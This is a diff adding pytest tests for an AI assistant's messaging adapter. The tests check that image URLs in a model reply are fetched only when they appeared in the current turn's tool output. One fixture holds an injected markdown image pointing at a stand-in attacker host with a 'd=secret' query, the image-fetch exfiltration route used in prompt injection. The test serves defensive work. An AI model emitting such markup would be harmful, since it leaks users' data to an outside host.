@@ -449,6 +449,89 @@ async def test_history_lookup_worker_start_failure_fails_open_and_releases_slot(
 
 
 # ---------------------------------------------------------------------------
+# Reply-image provenance on the non-streaming path (#129975)
+# ---------------------------------------------------------------------------
+
+class _ProvenanceStore:
+    """Session store whose transcript ends with the CURRENT turn: user request,
+    this turn's tool result, then the already-persisted assistant reply."""
+
+    def __init__(self, tool_content):
+        self._transcript = [
+            {"role": "user", "content": "earlier request"},
+            {"role": "tool", "tool_call_id": "t0",
+             "content": "https://old-turn.example/stale.png"},
+            {"role": "assistant", "content": "earlier reply"},
+            {"role": "user", "content": "generate an image"},
+            {"role": "tool", "tool_call_id": "t1", "content": tool_content},
+            {"role": "assistant", "content": "Here: ![gen](https://fal.media/files/abc/output.png)"},
+        ]
+
+    def peek_session_id(self, session_key):
+        return "sess-1"
+
+    def load_transcript(self, session_id):
+        return list(self._transcript)
+
+
+@pytest.mark.asyncio
+async def test_provenanced_reply_image_url_is_delivered(tmp_path, monkeypatch):
+    """#129975: a reply image URL that occurred verbatim in the current turn's
+    tool result is still fetched and delivered as an image."""
+    adapter = _DummyAdapter()
+    adapter._keep_typing = _hold_typing
+    adapter.set_session_store(_ProvenanceStore(
+        "saved https://fal.media/files/abc/output.png ok"))
+
+    async def handler(_event):
+        return "Here: ![gen](https://fal.media/files/abc/output.png)"
+
+    adapter.set_message_handler(handler)
+    event = _make_event()
+    await adapter._process_message_background(event, build_session_key(event.source))
+
+    assert adapter.images_sent == ["https://fal.media/files/abc/output.png"]
+
+
+@pytest.mark.asyncio
+async def test_non_provenanced_reply_image_url_stays_a_link(tmp_path, monkeypatch):
+    """#129975 (fail-closed): the current turn ran no tools, so an image-looking URL
+    the model wrote on its own is NOT fetched — the markup stays in the delivered text
+    (a prior turn's tool URL does not count as provenance)."""
+    adapter = _DummyAdapter()
+    adapter._keep_typing = _hold_typing
+    adapter.set_session_store(_ProvenanceStore("no urls here"))
+
+    injected = "![x](https://attacker.example/p.png?d=secret)"
+    async def handler(_event):
+        return f"See {injected}"
+
+    adapter.set_message_handler(handler)
+    event = _make_event()
+    await adapter._process_message_background(event, build_session_key(event.source))
+
+    assert adapter.images_sent == []
+    assert any(injected in s["content"] for s in adapter.sent), adapter.sent
+
+
+@pytest.mark.asyncio
+async def test_reply_image_provenance_fails_open_without_store(tmp_path, monkeypatch):
+    """#129975 (fail-open): no transcript to judge by keeps the legacy
+    extract-everything behavior — delivery never breaks on a missing store."""
+    adapter = _DummyAdapter()
+    adapter._keep_typing = _hold_typing
+
+    async def handler(_event):
+        return "Here: ![gen](https://fal.media/files/abc/output.png)"
+
+    adapter.set_message_handler(handler)
+    event = _make_event()
+    await adapter._process_message_background(event, build_session_key(event.source))
+
+    assert adapter.images_sent == ["https://fal.media/files/abc/output.png"]
+
+
+# ---------------------------------------------------------------------------
 # Streaming sibling (run.py _deliver_media_from_response)
 # ---------------------------------------------------------------------------
 
